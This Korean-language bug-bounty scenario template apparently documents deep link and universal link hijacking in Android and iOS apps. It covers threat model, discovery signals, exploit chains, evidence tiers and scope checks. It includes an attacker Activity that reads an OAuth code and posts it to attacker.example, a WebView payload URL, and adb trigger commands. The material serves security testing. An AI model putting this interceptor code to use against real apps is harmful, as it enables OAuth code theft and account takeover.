# Scenario: Insecure Deep Link / Universal Link Hijacking

> Android intent filter 또는 iOS Universal Link 검증 결함으로 다른 앱이 호출 인터셉트.

## 1. Threat Model
- **타겟**: Android/iOS 앱 (특히 OAuth callback, payment, 2FA 링크 처리)
- **공격자**: 악성 앱 설치 유도 (Play Store/App Store에 legitimate-looking 앱, 또는 victim에 sideload)
- **Impact**: OAuth code 탈취 → ATO, 민감 deeplink param 탈취, 내부 WebView로 XSS
- **Severity**: High (OAuth code 탈취 경로)

## 2. Discovery Signals
- `AndroidManifest.xml`의 `<intent-filter>`에 `<data android:scheme="...">`
- `exported="true"` 액티비티
- Custom scheme만 사용 (`myapp://`) — 여러 앱이 등록 가능
- iOS: `apple-app-site-association` 파일 누락 또는 과다 경로
- Deeplink param이 WebView에 전달 (loadUrl, JS interface)

## 3. Exploit Chain

### 3.1 Custom scheme collision
```xml
<!-- Victim app manifest -->
<intent-filter>
  <data android:scheme="myapp" android:host="oauth" />
</intent-filter>

<!-- Attacker app도 동일 scheme 등록 -->
<intent-filter>
  <data android:scheme="myapp" android:host="oauth" />
</intent-filter>
```
OAuth provider가 `myapp://oauth?code=...` 로 redirect → Android가 chooser 표시 또는 우선순위 기반으로 attacker 앱 실행 → code 탈취.

### 3.2 Universal Link 검증 실패 (iOS)
```
apple-app-site-association 파일에 과다 경로:
{"applinks": {"details": [{"appIDs":["..."], "paths":["*"]}]}}

공격자 앱이 같은 도메인 경로를 associated domain으로 주장
(iOS가 마지막 설치 앱 우선) → universal link 인터셉트
```

### 3.3 Deeplink param → WebView XSS
```
myapp://open?url=https://attacker.example/xss.html

앱 코드:
webView.loadUrl(intent.getData().getQueryParameter("url"));
// URL 검증 없음 → 공격자 URL 로드 → JS interface 노출 시 RCE
```

### 3.4 PendingIntent mutability (Android 12+)
```
예전 PendingIntent MUTABLE 기본값 악용 — 12+에서는 명시 필요
구버전 compat 코드에서 여전히 발생
```

## 4. PoC Template
```bash
# ADB로 deeplink trigger
adb shell am start -W -a android.intent.action.VIEW \
  -d "myapp://oauth?code=stolen&state=x" com.victim.app
# 또는 악성 앱 설치 후 활성 앱 확인

# apk 분석
apktool d victim.apk
grep -rE "android:scheme|exported=\"true\"" victim/AndroidManifest.xml
```

```java
// Attacker app — OAuth code intercept
public class OAuthInterceptor extends Activity {
  protected void onCreate(Bundle s) {
    Uri data = getIntent().getData();
    String code = data.getQueryParameter("code");
    // 자체 C2로 전송
    new HttpClient().post("https://attacker.example/c?code=" + code);
    finish();
  }
}
```

## 5. Evidence Tier
- E1: PoC 앱 설치 후 victim 앱의 OAuth flow에서 code 탈취 스크린샷
- E2: Manifest / AASA 파일 분석으로 vulnerable 설정 증명
- E3: 코드 리뷰만

## 6. Gate 1 / Gate 2
- [ ] App scheme verification 누락이 실제로 OAuth provider에서 허용되는지
- [ ] Universal Link 경우 도메인 associated domain 검증이 이미 되어 있을 수도
- [ ] 프로그램이 Mobile scope에 포함?
- [ ] 악성 앱 사전 설치 전제가 realistic? (Play Store 통과 난이도 증가)

## 7. Variants
- **Implicit intent broadcast** 탈취
- **Content provider path traversal**
- **App Links (Android)** 검증 설정 누락 (assetlinks.json)
- **App-to-app deeplink chaining** (A → B → C 권한 상승)

## 8. References
- OWASP MASTG — https://mas.owasp.org/MASTG/
- Mitre ATT&CK Mobile — Deep Link 관련 TTP
- HackerOne: 여러 OAuth deeplink disclosure (Uber, Shopify 등)
- `knowledge/techniques/mobile_testing_mastg.md`
